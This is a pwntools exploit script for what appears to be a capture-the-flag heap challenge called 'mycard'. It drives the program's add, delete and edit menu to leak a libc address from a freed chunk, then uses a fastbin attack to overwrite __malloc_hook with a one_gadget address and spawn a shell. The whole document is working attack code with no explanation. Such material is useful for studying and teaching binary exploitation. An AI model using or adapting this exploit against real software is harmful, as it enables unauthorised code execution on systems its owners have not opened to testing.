from pwn import *
context.log_level = "debug"
p = process("./mycard")
elf = ELF("./mycard")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

cmd = lambda c : p.sendlineafter("4:exit\n" , str(c))
def add(name , size , desc):
	cmd(1)
	p.sendlineafter("Name:" , name)
	p.sendlineafter("Len:" , str(size))
	p.sendlineafter("Description:" , desc)

def delete(index):
	cmd(2)
	p.sendlineafter(">" , str(index))

def edit(index , name , size , desc):
	cmd(3)
	p.sendlineafter(">" , str(index))
	p.sendlineafter("New name?" , name)
	p.sendlineafter("Len?" , str(size))
	p.sendlineafter("Description :" , desc)
# leak libc
add("leak" , 0xb0 , "leak") # 1  # 0x70 (freed) # 0xb0
delete(1)                   
add("leak" , 0x90 , "leaklea") # 1  
cmd(2) 
p.recvuntil("leaklea\x00")
main_arena =  u64(p.recv(8)) - 88
libc.address = main_arena - 0x3c4b20
malloc_hook = libc.sym["__malloc_hook"]
log.success("libc : " + hex(libc.address))
log.success("__malloc_hook : " + hex(malloc_hook))
p.sendline("") # end show
if "\x0a" in p64(malloc_hook):
	p.close()
	print("malloc_hook error")
	exit(0)
# fastbin attack to hijacked __malloc_hook
add("test" , 0x20 , "test") # 2 - > 1
add("test2" , 0x10 , "test2")
# gdb.attach(p , "pie break *0x1765")
delete(1)
one_gadget = libc.address + 0x4526a 
edit(1 , "attack" , 0x90 , "a" * 0x8c + p64(0) + p64(0x71) + p64(malloc_hook - 0x23)[:7])
add("test2" , 0x20 , "test") # 4
add(("a" * 0x13 + p64(one_gadget)).ljust(0x39 , "\x00") , 0x20 , "test") # 4 # malloc(0x18)
"""
0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
"""
p.interactive()